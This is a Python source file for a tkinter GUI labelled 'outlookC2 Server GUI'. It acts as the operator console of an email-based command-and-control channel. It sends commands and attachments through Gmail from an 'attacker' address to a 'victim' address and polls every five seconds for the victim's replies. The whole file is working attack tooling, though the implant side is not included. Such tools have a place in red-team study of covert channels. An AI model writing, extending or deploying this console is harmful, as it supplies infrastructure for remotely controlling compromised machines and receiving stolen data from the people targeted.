import smtplib
import imaplib
import email
import getpass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import time
import tkinter as tk
from tkinter import scrolledtext, filedialog
import threading
import os
import re
from tkinter import scrolledtext, StringVar

def send_email(smtp_server, port, username, password, recipient, subject, body, attachment_path=None):
    try:
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login(username, password)

        msg = MIMEMultipart()
        msg['From'] = username
        msg['To'] = recipient
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain', 'utf-8'))

        if attachment_path:
            attachment_name = os.path.basename(attachment_path)
            with open(attachment_path, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename= {attachment_name}",
                )
                msg.attach(part)

        text = msg.as_string()

        server.sendmail(username, recipient, text)
        print(f"Sent email to {recipient}")

        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")

def fetch_email(imap_server, username, password, mailbox='inbox'):
    global last_seen_email_id
    try:
        mail = imaplib.IMAP4_SSL(imap_server)
        mail.login(username, password)
        mail.select(mailbox)

        result, data = mail.search(None, 'FROM', f'"{recipient}"')
#        print("result=", result, " data=", data)
        mail_ids = data[0].split()

        if not mail_ids:
            return None

        latest_email_id = mail_ids[-1]

        if latest_email_id == last_seen_email_id:
            return None

        last_seen_email_id = latest_email_id

        result, data = mail.fetch(latest_email_id, '(RFC822)')
        raw_email = data[0][1]
        msg = email.message_from_bytes(raw_email)

        email_body = None
        if msg.is_multipart():
            for part in msg.walk():
                if part.get_content_type() == "text/plain":
                    email_body = part.get_payload(decode=True).decode('utf-8')
                    break
        else:
            email_body = msg.get_payload(decode=True).decode('utf-8')
        email_body = re.sub(r"(?<=\S{76})\r?\n", "", email_body)
        return f"From: {msg['From']}\nSubject: {msg['Subject']}\n\n{email_body}"
    except Exception as e:
        print(f"Error receiving email: {e}")
        return None

def start_email_checker():
    while True:
        time.sleep(5)
        email_content = fetch_email(imap_server, username, password)
        if email_content:
            email_display.insert(tk.END, email_content + "\n\n")

def on_send_email():
    subject = subject_entry.get()
    body = body_entry.get("1.0", tk.END)
    attachment_path = attachment_path_var.get()
    send_email(smtp_server, port, username, password, recipient, subject, body, attachment_path)

def browse_file():
    filename = filedialog.askopenfilename()
    attachment_path_var.set(filename)

def clear_email_display():
    email_display.delete('1.0', tk.END)  # Clear text box

# Function to create labeled entry fields
def create_labeled_entry(parent, label_text, row, column, colspan=1, sticky=tk.W):
    """Creates a labeled entry field."""
    tk.Label(parent, text=label_text).grid(row=row, column=column, sticky=sticky, pady=5)
    entry = tk.Entry(parent)
    entry.grid(row=row, column=column + 1, columnspan=colspan, sticky=tk.EW, pady=5)
    return entry

# Function to create a frame for section headers
def create_section_header(parent, text, side=tk.LEFT, font=("Arial", 12, "bold")):
    """Creates a section header with an optional button next to it."""
    frame = tk.Frame(parent)
    frame.pack(fill=tk.X, pady=5)
    label = tk.Label(frame, text=text, font=font)
    label.pack(side=side, anchor=tk.W)
    return frame, label


smtp_server = 'smtp.gmail.com'
imap_server = 'imap.gmail.com'
port = 587
#username = input("Your email address: ")
username = "attackerSender@testmail.com"
password = getpass.getpass('Password: ')
#recipient = input("Target email address: ")
recipient = "victimRecipient@testmail.com"


last_seen_email_id = None

# Initialize the root window
root = tk.Tk()
root.title("outlookC2 Server GUI")
root.geometry("1200x900")  # Set default window size

# Compose Email Section
send_frame = tk.LabelFrame(root, text="Compose Email", padx=10, pady=10)
send_frame.pack(side=tk.TOP, fill=tk.X, padx=10, pady=5)

# Subject field and Send button
subject_entry = create_labeled_entry(send_frame, "Subject:", 0, 0, sticky=tk.W)
send_button = tk.Button(send_frame, text="Send Email", command=on_send_email)
send_button.grid(row=0, column=2, sticky=tk.E, pady=5, padx=5)

# Body text field
tk.Label(send_frame, text="Body:").grid(row=1, column=0, sticky=tk.NW, pady=5)
body_entry = tk.Text(send_frame, height=5, wrap=tk.WORD)
body_entry.grid(row=1, column=1, columnspan=2, sticky=tk.EW, pady=5)

send_frame.columnconfigure(1, weight=1)  # Allow horizontal resizing of input fields

# Attachments Section
attachment_frame = tk.LabelFrame(root, text="Attachments", padx=10, pady=10)
attachment_frame.pack(side=tk.TOP, fill=tk.X, padx=10, pady=5)

attachment_path_var = StringVar()
attachment_entry = tk.Entry(attachment_frame, textvariable=attachment_path_var)
attachment_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
browse_button = tk.Button(attachment_frame, text="Browse", command=browse_file)
browse_button.pack(side=tk.LEFT, padx=10)

# Responses Section
receive_frame = tk.LabelFrame(root, text="Response", padx=10, pady=10)
receive_frame.pack(side=tk.BOTTOM, fill=tk.BOTH, expand=True, padx=10, pady=5)

# Section header with "Email Responses" and Clear button
response_header_frame, response_label = create_section_header(receive_frame, "Email Responses")
clear_button = tk.Button(response_header_frame, text="Clear", command=lambda: email_display.delete("1.0", tk.END))
clear_button.pack(side=tk.RIGHT, padx=10)

# Email display with scrollbars
email_display_frame = tk.Frame(receive_frame)
email_display_frame.pack(fill=tk.BOTH, expand=True)

email_display = scrolledtext.ScrolledText(
    email_display_frame,
    wrap=tk.NONE,
    font=("Courier", 12),  # Use a readable monospaced font
    height=30
)
email_display.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

horizontal_scroll = tk.Scrollbar(email_display_frame, orient=tk.HORIZONTAL, command=email_display.xview)
horizontal_scroll.pack(side=tk.BOTTOM, fill=tk.X)
email_display.config(xscrollcommand=horizontal_scroll.set)

# Start email checker in a separate thread
threading.Thread(target=start_email_checker, daemon=True).start()

# Run the main loop
root.mainloop()
